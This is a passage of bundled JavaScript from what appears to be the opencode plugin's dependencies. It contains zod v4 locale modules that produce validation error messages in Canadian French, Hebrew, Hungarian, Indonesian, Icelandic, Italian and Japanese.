        return `Nombre invalide : doit \xEAtre un multiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue3.keys.length > 1 ? "s" : ""} non reconnue${issue3.keys.length > 1 ? "s" : ""} : ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue3.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue3.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_CA_default2() {
  return {
    localeError: error61()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/he.js
var error62 = () => {
  const Sizable = {
    string: { unit: "\u05D0\u05D5\u05EA\u05D9\u05D5\u05EA", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    file: { unit: "\u05D1\u05D9\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    array: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    set: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u05E7\u05DC\u05D8",
    email: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05D0\u05D9\u05DE\u05D9\u05D9\u05DC",
    url: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05E8\u05E9\u05EA",
    emoji: "\u05D0\u05D9\u05DE\u05D5\u05D2'\u05D9",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u05EA\u05D0\u05E8\u05D9\u05DA \u05D5\u05D6\u05DE\u05DF ISO",
    date: "\u05EA\u05D0\u05E8\u05D9\u05DA ISO",
    time: "\u05D6\u05DE\u05DF ISO",
    duration: "\u05DE\u05E9\u05DA \u05D6\u05DE\u05DF ISO",
    ipv4: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv4",
    ipv6: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv6",
    cidrv4: "\u05D8\u05D5\u05D5\u05D7 IPv4",
    cidrv6: "\u05D8\u05D5\u05D5\u05D7 IPv6",
    base64: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64",
    base64url: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64 \u05DC\u05DB\u05EA\u05D5\u05D1\u05D5\u05EA \u05E8\u05E9\u05EA",
    json_string: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA JSON",
    e164: "\u05DE\u05E1\u05E4\u05E8 E.164",
    jwt: "JWT",
    template_literal: "\u05E7\u05DC\u05D8"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA ${issue3.expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05D0\u05D7\u05EA \u05DE\u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA  ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${issue3.origin ?? "value"} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${issue3.origin ?? "value"} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${issue3.origin} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${issue3.origin} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D7\u05D9\u05DC \u05D1"${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05E1\u05EA\u05D9\u05D9\u05DD \u05D1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05DB\u05DC\u05D5\u05DC "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D0\u05D9\u05DD \u05DC\u05EA\u05D1\u05E0\u05D9\u05EA ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
      }
      case "not_multiple_of":
        return `\u05DE\u05E1\u05E4\u05E8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA \u05DE\u05DB\u05E4\u05DC\u05D4 \u05E9\u05DC ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u05DE\u05E4\u05EA\u05D7${issue3.keys.length > 1 ? "\u05D5\u05EA" : ""} \u05DC\u05D0 \u05DE\u05D6\u05D5\u05D4${issue3.keys.length > 1 ? "\u05D9\u05DD" : "\u05D4"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u05DE\u05E4\u05EA\u05D7 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${issue3.origin}`;
      case "invalid_union":
        return "\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF";
      case "invalid_element":
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${issue3.origin}`;
      default:
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
    }
  };
};
function he_default2() {
  return {
    localeError: error62()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/hu.js
var error63 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "legyen" },
    file: { unit: "byte", verb: "legyen" },
    array: { unit: "elem", verb: "legyen" },
    set: { unit: "elem", verb: "legyen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "sz\xE1m";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "t\xF6mb";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "bemenet",
    email: "email c\xEDm",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO id\u0151b\xE9lyeg",
    date: "ISO d\xE1tum",
    time: "ISO id\u0151",
    duration: "ISO id\u0151intervallum",
    ipv4: "IPv4 c\xEDm",
    ipv6: "IPv6 c\xEDm",
    cidrv4: "IPv4 tartom\xE1ny",
    cidrv6: "IPv6 tartom\xE1ny",
    base64: "base64-k\xF3dolt string",
    base64url: "base64url-k\xF3dolt string",
    json_string: "JSON string",
    e164: "E.164 sz\xE1m",
    jwt: "JWT",
    template_literal: "bemenet"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${issue3.expected}, a kapott \xE9rt\xE9k ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xC9rv\xE9nytelen opci\xF3: valamelyik \xE9rt\xE9k v\xE1rt ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `T\xFAl nagy: ${issue3.origin ?? "\xE9rt\xE9k"} m\xE9rete t\xFAl nagy ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elem"}`;
        return `T\xFAl nagy: a bemeneti \xE9rt\xE9k ${issue3.origin ?? "\xE9rt\xE9k"} t\xFAl nagy: ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue3.origin} m\xE9rete t\xFAl kicsi ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue3.origin} t\xFAl kicsi ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\xC9rv\xE9nytelen string: "${_issue.prefix}" \xE9rt\xE9kkel kell kezd\u0151dnie`;
        if (_issue.format === "ends_with")
          return `\xC9rv\xE9nytelen string: "${_issue.suffix}" \xE9rt\xE9kkel kell v\xE9gz\u0151dnie`;
        if (_issue.format === "includes")
          return `\xC9rv\xE9nytelen string: "${_issue.includes}" \xE9rt\xE9ket kell tartalmaznia`;
        if (_issue.format === "regex")
          return `\xC9rv\xE9nytelen string: ${_issue.pattern} mint\xE1nak kell megfelelnie`;
        return `\xC9rv\xE9nytelen ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\xC9rv\xE9nytelen sz\xE1m: ${issue3.divisor} t\xF6bbsz\xF6r\xF6s\xE9nek kell lennie`;
      case "unrecognized_keys":
        return `Ismeretlen kulcs${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\xC9rv\xE9nytelen kulcs ${issue3.origin}`;
      case "invalid_union":
        return "\xC9rv\xE9nytelen bemenet";
      case "invalid_element":
        return `\xC9rv\xE9nytelen \xE9rt\xE9k: ${issue3.origin}`;
      default:
        return `\xC9rv\xE9nytelen bemenet`;
    }
  };
};
function hu_default2() {
  return {
    localeError: error63()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/id.js
var error64 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "memiliki" },
    file: { unit: "byte", verb: "memiliki" },
    array: { unit: "item", verb: "memiliki" },
    set: { unit: "item", verb: "memiliki" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "alamat email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tanggal dan waktu format ISO",
    date: "tanggal format ISO",
    time: "jam format ISO",
    duration: "durasi format ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "rentang alamat IPv4",
    cidrv6: "rentang alamat IPv6",
    base64: "string dengan enkode base64",
    base64url: "string dengan enkode base64url",
    json_string: "string JSON",
    e164: "angka E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input tidak valid: diharapkan ${issue3.expected}, diterima ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input tidak valid: diharapkan ${stringifyPrimitive2(issue3.values[0])}`;
        return `Pilihan tidak valid: diharapkan salah satu dari ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Terlalu besar: diharapkan ${issue3.origin ?? "value"} memiliki ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: diharapkan ${issue3.origin ?? "value"} menjadi ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Terlalu kecil: diharapkan ${issue3.origin} memiliki ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: diharapkan ${issue3.origin} menjadi ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `String tidak valid: harus dimulai dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak valid: harus berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak valid: harus menyertakan "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak valid: harus sesuai pola ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} tidak valid`;
      }
      case "not_multiple_of":
        return `Angka tidak valid: harus kelipatan dari ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali ${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak valid di ${issue3.origin}`;
      case "invalid_union":
        return "Input tidak valid";
      case "invalid_element":
        return `Nilai tidak valid di ${issue3.origin}`;
      default:
        return `Input tidak valid`;
    }
  };
};
function id_default2() {
  return {
    localeError: error64()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/is.js
var parsedType4 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "n\xFAmer";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "fylki";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error65 = () => {
  const Sizable = {
    string: { unit: "stafi", verb: "a\xF0 hafa" },
    file: { unit: "b\xE6ti", verb: "a\xF0 hafa" },
    array: { unit: "hluti", verb: "a\xF0 hafa" },
    set: { unit: "hluti", verb: "a\xF0 hafa" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "gildi",
    email: "netfang",
    url: "vefsl\xF3\xF0",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dagsetning og t\xEDmi",
    date: "ISO dagsetning",
    time: "ISO t\xEDmi",
    duration: "ISO t\xEDmalengd",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded strengur",
    base64url: "base64url-encoded strengur",
    json_string: "JSON strengur",
    e164: "E.164 t\xF6lugildi",
    jwt: "JWT",
    template_literal: "gildi"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Rangt gildi: \xDE\xFA sl\xF3st inn ${parsedType4(issue3.input)} \xFEar sem \xE1 a\xF0 vera ${issue3.expected}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Rangt gildi: gert r\xE1\xF0 fyrir ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xD3gilt val: m\xE1 vera eitt af eftirfarandi ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin ?? "gildi"} hafi ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "hluti"}`;
        return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin ?? "gildi"} s\xE9 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin} hafi ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin} s\xE9 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\xD3gildur strengur: ver\xF0ur a\xF0 byrja \xE1 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 enda \xE1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 innihalda "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 fylgja mynstri ${_issue.pattern}`;
        return `Rangt ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `R\xF6ng tala: ver\xF0ur a\xF0 vera margfeldi af ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\xD3\xFEekkt ${issue3.keys.length > 1 ? "ir lyklar" : "ur lykill"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Rangur lykill \xED ${issue3.origin}`;
      case "invalid_union":
        return "Rangt gildi";
      case "invalid_element":
        return `Rangt gildi \xED ${issue3.origin}`;
      default:
        return `Rangt gildi`;
    }
  };
};
function is_default2() {
  return {
    localeError: error65()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/it.js
var error66 = () => {
  const Sizable = {
    string: { unit: "caratteri", verb: "avere" },
    file: { unit: "byte", verb: "avere" },
    array: { unit: "elementi", verb: "avere" },
    set: { unit: "elementi", verb: "avere" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType5 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "numero";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "vettore";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "indirizzo email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e ora ISO",
    date: "data ISO",
    time: "ora ISO",
    duration: "durata ISO",
    ipv4: "indirizzo IPv4",
    ipv6: "indirizzo IPv6",
    cidrv4: "intervallo IPv4",
    cidrv6: "intervallo IPv6",
    base64: "stringa codificata in base64",
    base64url: "URL codificata in base64",
    json_string: "stringa JSON",
    e164: "numero E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input non valido: atteso ${issue3.expected}, ricevuto ${parsedType5(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input non valido: atteso ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opzione non valida: atteso uno tra ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Troppo grande: ${issue3.origin ?? "valore"} deve avere ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementi"}`;
        return `Troppo grande: ${issue3.origin ?? "valore"} deve essere ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Troppo piccolo: ${issue3.origin} deve avere ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Troppo piccolo: ${issue3.origin} deve essere ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Stringa non valida: deve iniziare con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Stringa non valida: deve terminare con "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Stringa non valida: deve includere "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Stringa non valida: deve corrispondere al pattern ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Numero non valido: deve essere un multiplo di ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Chiav${issue3.keys.length > 1 ? "i" : "e"} non riconosciut${issue3.keys.length > 1 ? "e" : "a"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Chiave non valida in ${issue3.origin}`;
      case "invalid_union":
        return "Input non valido";
      case "invalid_element":
        return `Valore non valido in ${issue3.origin}`;
      default:
        return `Input non valido`;
    }
  };
};
function it_default2() {
  return {
    localeError: error66()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ja.js
var error67 = () => {
  const Sizable = {
    string: { unit: "\u6587\u5B57", verb: "\u3067\u3042\u308B" },
    file: { unit: "\u30D0\u30A4\u30C8", verb: "\u3067\u3042\u308B" },
    array: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" },
    set: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType5 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u6570\u5024";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u914D\u5217";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u5165\u529B\u5024",
    email: "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9",
    url: "URL",
    emoji: "\u7D75\u6587\u5B57",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u6642",
    date: "ISO\u65E5\u4ED8",
    time: "ISO\u6642\u523B",
    duration: "ISO\u671F\u9593",
    ipv4: "IPv4\u30A2\u30C9\u30EC\u30B9",
    ipv6: "IPv6\u30A2\u30C9\u30EC\u30B9",
    cidrv4: "IPv4\u7BC4\u56F2",
    cidrv6: "IPv6\u7BC4\u56F2",
    base64: "base64\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    base64url: "base64url\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    json_string: "JSON\u6587\u5B57\u5217",
    e164: "E.164\u756A\u53F7",
    jwt: "JWT",
    template_literal: "\u5165\u529B\u5024"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u7121\u52B9\u306A\u5165\u529B: ${issue3.expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${parsedType5(issue3.input)}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u7121\u52B9\u306A\u5165\u529B: ${stringifyPrimitive2(issue3.values[0])}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F`;
        return `\u7121\u52B9\u306A\u9078\u629E: ${joinValues2(issue3.values, "\u3001")}\u306E\u3044\u305A\u308C\u304B\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u4EE5\u4E0B\u3067\u3042\u308B" : "\u3088\u308A\u5C0F\u3055\u3044";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue3.origin ?? "\u5024"}\u306F${issue3.maximum.toString()}${sizing.unit ?? "\u8981\u7D20"}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue3.origin ?? "\u5024"}\u306F${issue3.maximum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u4EE5\u4E0A\u3067\u3042\u308B" : "\u3088\u308A\u5927\u304D\u3044";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue3.origin}\u306F${issue3.minimum.toString()}${sizing.unit}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue3.origin}\u306F${issue3.minimum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.prefix}"\u3067\u59CB\u307E\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "ends_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.suffix}"\u3067\u7D42\u308F\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "includes")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.includes}"\u3092\u542B\u3080\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "regex")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: \u30D1\u30BF\u30FC\u30F3${_issue.pattern}\u306B\u4E00\u81F4\u3059\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u7121\u52B9\u306A${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u52B9\u306A\u6570\u5024: ${issue3.divisor}\u306E\u500D\u6570\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "unrecognized_keys":
        return `\u8A8D\u8B58\u3055\u308C\u3066\u3044\u306A\u3044\u30AD\u30FC${issue3.keys.length > 1 ? "\u7FA4" : ""}: ${joinValues2(issue3.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue3.origin}\u5185\u306E\u7121\u52B9\u306A\u30AD\u30FC`;
      case "invalid_union":
        return "\u7121\u52B9\u306A\u5165\u529B";
      case "invalid_element":
        return `${issue3.origin}\u5185\u306E\u7121\u52B9\u306A\u5024`;
      default:
        return `\u7121\u52B9\u306A\u5165\u529B`;
    }
  };
};
function ja_default2() {
  return {
    localeError: error67()
  };
}
